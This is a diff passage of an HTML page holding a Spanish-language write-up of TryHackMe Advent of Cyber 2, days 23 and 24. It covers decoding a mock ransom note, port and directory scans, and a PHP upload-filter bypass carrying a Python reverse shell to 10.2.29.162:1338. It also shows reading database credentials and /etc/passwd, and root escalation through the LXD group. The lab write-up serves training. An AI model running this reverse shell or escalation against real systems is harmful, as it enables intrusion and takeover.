class="mi">97</span><span class="p">,</span> <span class="mi">118</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">122</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">47</span><span class="p">);</span>
 
 <span class="c1">//smestring.src = hhttps://gist.github.com/heavenraiza/
@@ -4632,21 +4629,21 @@ PS C:<span class="se">\U</span>sers<span class="se">\l</span>ittlehelper<span cl
 </code></pre></td></tr></table>
 </div>
 </div><p><img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-2217.54.04.png" alt="image" /></p>
-<h1 id="day-23---the-grinch-strikes-again-">DAY 23 - The Grinch strikes again!</h1>
+<h1 id="day-23---the-grinch-strikes-again">DAY 23 - The Grinch strikes again!</h1>
 <p>En la descripcion del dia realizan una explicacion sobre Ransomware, Volume Shadow Copy Service y Task Scheduler, y que este malware puede hacer uso de tareas programadas. Para las diferentes tareas se hace el uso de las herramientas VSS y Task Scheduler.</p>
 <ul>
 <li><strong>Decrypt the fake &lsquo;bitcoin address&rsquo; within the ransom note. What is the plain text value?</strong>, en el escritorio encontramos una nota de &ldquo;rescate&rdquo; que esta &ldquo;encriptada&rdquo; pero es codificacion base64, la decodificamos y tenemos la &ldquo;direccion&rdquo; bitcoin.</li>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#As you were calmly looking at your documents I encrypted all the workstations at Best Festival Company just now. Including yours McEager! Send me lots and lots of money to my bitcoin address (bm9tb3JlYmVzdGZlc3RpdmFsY29tcGFueQ==) and MAYBE I&#39;ll give you the key to decrypt. &gt;:^p</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#As you were calmly looking at your documents I encrypted all the workstations at Best Festival Company just now. Including yours McEager! Send me lots and lots of money to my bitcoin address (bm9tb3JlYmVzdGZlc3RpdmFsY29tcGFueQ==) and MAYBE I&#39;ll give you the key to decrypt. &gt;:^p</span>
 
 sckull@tars:~$ <span class="nb">echo</span> <span class="nv">bm9tb3JlYmVzdGZlc3RpdmFsY29tcGFueQ</span><span class="o">==</span><span class="p">|</span>base64 -d
 nomorebestfestivalcompany
@@ -4677,14 +4674,14 @@ sckull@tars:~$
 <img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-2319.17.55.png" alt="image" /></p>
 </li>
 </ul>
-<h1 id="day-24---the-trial-before-christmas-">DAY 24 - The Trial Before Christmas</h1>
+<h1 id="day-24---the-trial-before-christmas">DAY 24 - The Trial Before Christmas</h1>
 <p>El ultimo dia presentan una descripcion de Burpsuite, MySQL, Cracking y Privilege Escalation LXD y una maquina la cual hay que obtener las respuestas a las tareas.</p>
 <ul>
 <li><strong>What ports are open?</strong>: Realizamos un escaneo de puertos donde encontramos el puerto 80 y 65000 abiertos.</li>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -4696,7 +4693,7 @@ sckull@tars:~$
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.80 scan initiated Thu Dec 24 17:56:29 2020 as: nmap -p- --min-rate 1000 -o scanPorts 10.10.88.80</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.80 scan initiated Thu Dec 24 17:56:29 2020 as: nmap -p- --min-rate 1000 -o scanPorts 10.10.88.80</span>
 Warning: 10.10.88.80 giving up on port because retransmission cap hit <span class="o">(</span>10<span class="o">)</span>.
 Nmap scan report <span class="k">for</span> 10.10.88.80 <span class="o">(</span>10.10.88.80<span class="o">)</span>
 Host is up <span class="o">(</span>0.34s latency<span class="o">)</span>.
@@ -4713,7 +4710,7 @@ PORT      STATE SERVICE
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -4729,7 +4726,7 @@ PORT      STATE SERVICE
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#PUERTO 80</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#PUERTO 80</span>
 <span class="c1">#wfuzz -c -w /usr/share/wordlists/dirb/big.txt --hc 404 http://10.10.88.80/3/9/9/2/3/6/4/</span>
 /codes/
 /3/
@@ -4758,7 +4755,7 @@ kali@kali:~/thm/adventcyber2$ gobuster dir -u http://10.10.88.80:65000/ -w /usr/
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -4782,7 +4779,7 @@ kali@kali:~/thm/adventcyber2$ gobuster dir -u http://10.10.88.80:65000/ -w /usr/
 </span><span class="lnt">22
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="c1">//filter.js
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="c1">//filter.js
 </span><span class="c1"></span><span class="kr">const</span> <span class="nx">filter</span> <span class="o">=</span> <span class="nx">file</span> <span class="p">=&gt;</span> <span class="p">{</span>
   <span class="k">if</span><span class="p">([</span><span class="s2">&#34;image/png&#34;</span><span class="p">,</span> <span class="s2">&#34;image/jpeg&#34;</span><span class="p">,</span> <span class="s2">&#34;image/jpg&#34;</span><span class="p">].</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">file</span><span class="p">.</span><span class="nx">type</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
     <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
@@ -4812,13 +4809,13 @@ kali@kali:~/thm/adventcyber2$ gobuster dir -u http://10.10.88.80:65000/ -w /usr/
 <p>Creamos un archivo que ejecute nuestra shell inversa con el nombre y codigo <code>shell.jpg.php</code>:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">&lt;?php
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">&lt;?php
 system<span class="o">(</span><span class="s2">&#34;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&#34;10.2.29.162\&#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&#34;/bin/sh\&#34;,\&#34;-i\&#34;]);&#39;&#34;</span><span class="o">)</span><span class="p">;</span>
 
 ?&gt;
@@ -4830,7 +4827,7 @@ system<span class="o">(</span><span class="s2">&#34;python3 -c &#39;import socke
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -4839,7 +4836,7 @@ system<span class="o">(</span><span class="s2">&#34;python3 -c &#39;import socke
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">www-data@light-cycle:/var/www/TheGrid/public_html/grid$ find / -name web.txt 2&gt;/dev/null
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@light-cycle:/var/www/TheGrid/public_html/grid$ find / -name web.txt 2&gt;/dev/null
 &lt;/public_html/grid$ find / -name web.txt 2&gt;/dev/null    
 /var/www/web.txt
 www-data@light-cycle:/var/www/TheGrid/public_html/grid$ cat /var/www/web.txt
@@ -4858,7 +4855,7 @@ www-data@light-cycle:/var/www/TheGrid/public_html/grid$
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -4873,7 +4870,7 @@ www-data@light-cycle:/var/www/TheGrid/public_html/grid$
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">www-data@light-cycle:/var/www/TheGrid/includes$ cat dbauth.php
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@light-cycle:/var/www/TheGrid/includes$ cat dbauth.php
 cat dbauth.php
 &lt;?php
   <span class="nv">$dbaddr</span> <span class="o">=</span> <span class="s2">&#34;localhost&#34;</span><span class="p">;</span>
@@ -4893,7 +4890,7 @@ cat dbauth.php
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -4931,7 +4928,7 @@ cat dbauth.php
 </span><span class="lnt">36
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">www-data@light-cycle:/var/www/TheGrid/includes$ mysql -u tron -p
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@light-cycle:/var/www/TheGrid/includes$ mysql -u tron -p
 <span class="o">[</span>... snip ...<span class="o">]</span>
 
 mysql&gt; show databases<span class="p">;</span>
@@ -4980,7 +4977,7 @@ mysql&gt;
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -5011,7 +5008,7 @@ mysql&gt;
 </span><span class="lnt">29
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">www-data@light-cycle:/var/www/TheGrid/includes$ cat /etc/passwd
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@light-cycle:/var/www/TheGrid/includes$ cat /etc/passwd
 cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 <span class="o">[</span>... snip ...<span class="o">]</span>
@@ -5047,7 +5044,7 @@ flynn@light-cycle:~$
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -5056,7 +5053,7 @@ flynn@light-cycle:~$
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">flynn@light-cycle:~$ id
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">flynn@light-cycle:~$ id
 id
 <span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>flynn<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>flynn<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>flynn<span class="o">)</span>,109<span class="o">(</span>lxd<span class="o">)</span>
 flynn@light-cycle:~$ groups
@@ -5070,7 +5067,7 @@ flynn@light-cycle:~$
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -5085,7 +5082,7 @@ flynn@light-cycle:~$
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#LOCAL</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#LOCAL</span>
 git clone  https://github.com/saghul/lxd-alpine-builder.git
 <span class="nb">cd</span> lxd-alpine-builder
 ./build-alpine -a i686
@@ -5106,7 +5103,7 @@ lxc <span class="nb">exec</span> sckull /bin/sh
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -5131,7 +5128,7 @@ lxc <span class="nb">exec</span> sckull /bin/sh
 </span><span class="lnt">23
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">~ <span class="c1"># cd /mnt/root/root</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">~ <span class="c1"># cd /mnt/root/root</span>
 <span class="nb">cd</span> /mnt/root/root
 /mnt/root/root <span class="c1"># ls -lah</span>
 ls -lah
@@ -5153,7 +5150,7 @@ THM<span class="o">{</span>FLY<span class="o">[</span>... snip ...<span class="o
 
 
 <span class="s2">&#34;As Elf McEager claimed the root flag a click could be heard as a small chamber on the anterior of the NUC popped open. Inside, McEager saw a small object, roughly the size of an SD card. As a moment, he realized that was exactly what it was. Perplexed, McEager shuffled around his desk to pick up the card and slot it into his computer. Immediately this prompted a window to open with the word &#39;HOLO&#39; embossed in the center of what appeared to be a network of computers. Beneath this McEager read the following: Thank you for playing! Merry Christmas and happy holidays to all!&#34;</span>
-/mnt/root/root #
+/mnt/root/root <span class="c1">#</span>
 </code></pre></td></tr></table>
 </div>
 </div>
@@ -5447,7 +5444,7 @@ THM<span class="o">{</span>FLY<span class="o">[</span>... snip ...<span class="o
 </div>
 
 
-<script defer src="/js/swipe.min.08ff2be1b74347bad9e267f732f1388d271b2f9d97b6a8a87bd6a510f17c5ad2.js"></script>
+<script defer src="/js/swipe.min.d70095d96ef6a016133ea2c732c5d4713539d335b739178e356af46f54cf0a16.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
@@ -6561,37 +6558,37 @@ var a = document.getElementsByClassName('navbar__menu-item')
           <nav id="TableOfContents">
   <ul>
     <li><a href="#informacion">Informacion</a></li>
-    <li><a href="#day-1---web-exploitation-">DAY 1 - Web Exploitation</a></li>
-    <li><a href="#day-2---web-exploitation-">DAY 2 - Web Exploitation</a></li>
-    <li><a href="#day-3---web-exploitation-">DAY 3 - Web Exploitation</a></li>
-    <li><a href="#day-4---web-exploitation-">DAY 4 - Web Exploitation</a></li>
-    <li><a href="#day-5---web-exploitation-">DAY 5 - Web Exploitation</a></li>
-    <li><a href="#day-6---web-exploitation-">DAY 6 - Web Exploitation</a></li>
-    <li><a href="#day-7---networking-">DAY 7 - Networking</a></li>
-    <li><a href="#day-8---networking-">DAY 8 - Networking</a></li>
-    <li><a href="#day-9---networking-">DAY 9 - Networking</a></li>
-    <li><a href="#day-10---networking-">DAY 10 - Networking</a></li>
-    <li><a href="#day-11---networking-">DAY 11 - Networking</a></li>
-    <li><a href="#day-12---networking-">DAY 12 - Networking</a></li>
-    <li><a href="#day-13---coal-for-christmas-">DAY 13 - Coal for Christmas</a>
+    <li><a href="#day-1---web-exploitation">DAY 1 - Web Exploitation</a></li>
+    <li><a href="#day-2---web-exploitation">DAY 2 - Web Exploitation</a></li>
+    <li><a href="#day-3---web-exploitation">DAY 3 - Web Exploitation</a></li>
+    <li><a href="#day-4---web-exploitation">DAY 4 - Web Exploitation</a></li>
+    <li><a href="#day-5---web-exploitation">DAY 5 - Web Exploitation</a></li>
+    <li><a href="#day-6---web-exploitation">DAY 6 - Web Exploitation</a></li>
+    <li><a href="#day-7---networking">DAY 7 - Networking</a></li>
+    <li><a href="#day-8---networking">DAY 8 - Networking</a></li>
+    <li><a href="#day-9---networking">DAY 9 - Networking</a></li>
+    <li><a href="#day-10---networking">DAY 10 - Networking</a></li>
+    <li><a href="#day-11---networking">DAY 11 - Networking</a></li>
+    <li><a href="#day-12---networking">DAY 12 - Networking</a></li>
+    <li><a href="#day-13---coal-for-christmas">DAY 13 - Coal for Christmas</a>
       <ul>
-        <li><a href="#port-scanning---nmap-">PORT SCANNING - NMAP</a></li>
-        <li><a href="#initial-access---telnet-">INITIAL ACCESS - TELNET</a></li>
-        <li><a href="#enumeration-">ENUMERATION</a></li>
-        <li><a href="#privilege-escalation-">PRIVILEGE ESCALATION</a></li>
+        <li><a href="#port-scanning---nmap">PORT SCANNING - NMAP</a></li>
+        <li><a href="#initial-access---telnet">INITIAL ACCESS - TELNET</a></li>
+        <li><a href="#enumeration">ENUMERATION</a></li>
+        <li><a href="#privilege-escalation">PRIVILEGE ESCALATION</a></li>
       </ul>
     </li>
-    <li><a href="#day-14---wheres-rudolph-">DAY 14 - Where&rsquo;s Rudolph?</a></li>
-    <li><a href="#day-15---scripting-">DAY 15 - Scripting</a></li>
-    <li><a href="#day-16---scripting-">DAY 16 - Scripting</a></li>
-    <li><a href="#day-17---reverse-engineering-">DAY 17 - Reverse Engineering</a></li>
-    <li><a href="#day-18---reverse-engineering-">DAY 18 - Reverse Engineering</a></li>
-    <li><a href="#day-19---the-naughty-or-nice-list-">DAY 19 - The Naughty or Nice List</a></li>
-    <li><a href="#day-20----powershellf-to-the-rescue-">DAY 20 -  PowershELlF to the rescue</a></li>
-    <li><a href="#day-21---time-for-some-elforensics-">DAY 21 - Time for some ELForensics</a></li>
-    <li><a href="#day-22---elf-mceager-becomes-cyberelf-">DAY 22 - Elf McEager becomes CyberElf</a></li>
-    <li><a href="#day-23---the-grinch-strikes-again-">DAY 23 - The Grinch strikes again!</a></li>
-    <li><a href="#day-24---the-trial-before-christmas-">DAY 24 - The Trial Before Christmas</a></li>
+    <li><a href="#day-14---wheres-rudolph">DAY 14 - Where&rsquo;s Rudolph?</a></li>
+    <li><a href="#day-15---scripting">DAY 15 - Scripting</a></li>
+    <li><a href="#day-16---scripting">DAY 16 - Scripting</a></li>
+    <li><a href="#day-17---reverse-engineering">DAY 17 - Reverse Engineering</a></li>
+    <li><a href="#day-18---reverse-engineering">DAY 18 - Reverse Engineering</a></li>
+    <li><a href="#day-19---the-naughty-or-nice-list">DAY 19 - The Naughty or Nice List</a></li>
+    <li><a href="#day-20----powershellf-to-the-rescue">DAY 20 -  PowershELlF to the rescue</a></li>
+    <li><a href="#day-21---time-for-some-elforensics">DAY 21 - Time for some ELForensics</a></li>
+    <li><a href="#day-22---elf-mceager-becomes-cyberelf">DAY 22 - Elf McEager becomes CyberElf</a></li>
+    <li><a href="#day-23---the-grinch-strikes-again">DAY 23 - The Grinch strikes again!</a></li>
+    <li><a href="#day-24---the-trial-before-christmas">DAY 24 - The Trial Before Christmas</a></li>
   </ul>
 </nav>          
         </div>
